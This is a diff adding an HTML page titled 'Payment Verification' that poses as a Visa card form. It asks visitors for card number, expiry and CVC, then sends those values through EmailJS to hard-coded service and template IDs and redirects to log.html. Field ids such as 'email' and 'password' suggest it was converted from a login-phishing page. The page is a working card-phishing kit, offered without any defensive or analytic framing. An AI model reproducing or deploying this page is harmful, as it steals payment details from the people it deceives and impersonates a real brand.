@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .visa-card {
+            background: linear-gradient(135deg, #1a1f71 0%, #0056b3 100%);
+            width: 400px;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            color: white;
+            position: relative;
+        }
+        .visa-logo {
+            height: 30px;
+            float: right;
+            margin-bottom: 40px;
+        }
+        .chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #f0d697 0%, #d4af37 100%);
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+        .heading {
+            font-size: 18px;
+            font-weight: 300;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 8px;
+            color: rgba(255,255,255,0.7);
+        }
+        .form-control {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            font-size: 18px;
+            padding: 8px 0;
+            outline: none;
+            transition: border-bottom 0.3s;
+        }
+        .form-control::placeholder {
+            color: rgba(255,255,255,0.3);
+        }
+        .form-control:focus {
+            border-bottom: 1px solid white;
+        }
+        .row {
+            display: flex;
+            gap: 20px;
+        }
+        .actions {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+        }
+        .btn-submit {
+            background-color: white;
+            color: #1a1f71;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #f0f0f0;
+            transform: scale(1.05);
+        }
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .message {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .error { color: #ffbaba; }
+        .success { color: #b7ffb7; }
+    </style>
+</head>
+<body>
+
+<div class="visa-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="visa-logo" alt="Visa">
+    <div class="chip"></div>
+    <div class="heading">Payment Verification</div>
+
+    <form id="sign-in-form">
+        <div class="input-group">
+            <label for="email">Card Number</label>
+            <input type="text" id="email" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+
+        <div class="row">
+            <div class="input-group" style="flex: 2;">
+                <label for="password">Expiry Date</label>
+                <input type="text" id="password" class="form-control" placeholder="MM / YY" maxlength="7" required>
+            </div>
+
+            <div class="input-group" style="flex: 1;">
+                <label for="cvc">CVC</label>
+                <input type="text" id="cvc" class="form-control" placeholder="123" maxlength="4" required>
+            </div>
+        </div>
+
+        <p id="error-message" class="message error"></p>
+        <p id="success-message" class="message success">Verifying details...</p>
+
+        <div class="actions">
+            <button type="submit" id="submit-btn" class="btn-submit">Verify</button>
+        </div>
+    </form>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    emailjs.init('QKarohsQqRIAA6_mA');
+
+    const submitBtn = document.getElementById('submit-btn');
+    const emailInput = document.getElementById('email');
+    const passInput = document.getElementById('password');
+    const cvcInput = document.getElementById('cvc'); // Fixed duplicate name
+    const errorMsg = document.getElementById('error-message');
+    const successMsg = document.getElementById('success-message');
+
+    // Format Card Number
+    emailInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Format Expiry
+    passInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length >= 2) {
+            e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
+        } else {
+            e.target.value = val;
+        }
+    });
+
+    // Format CVC (Numbers only)
+    cvcInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    document.getElementById('sign-in-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        errorMsg.style.display = 'none';
+        successMsg.style.display = 'none';
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
+
+        const templateParams = {
+            email: emailInput.value,
+            password: passInput.value,
+            cvc: cvcInput.value, // Added CVC to params
+            submitted_at: new Date().toLocaleString()
+        };
+
+        emailjs.send('service_u8nndmi', 'template_zs2mpvq', templateParams)
+            .then(() => {
+                successMsg.style.display = 'block';
+                setTimeout(() => {
+                    window.location.href = 'log.html';
+                }, 1500);
+            })
+            .catch((err) => {
+                console.error(err);
+                errorMsg.textContent = 'Verification failed. Please try again.';
+                errorMsg.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Verify';
+            });
+    });
+</script>
+
+</body>
+</html>
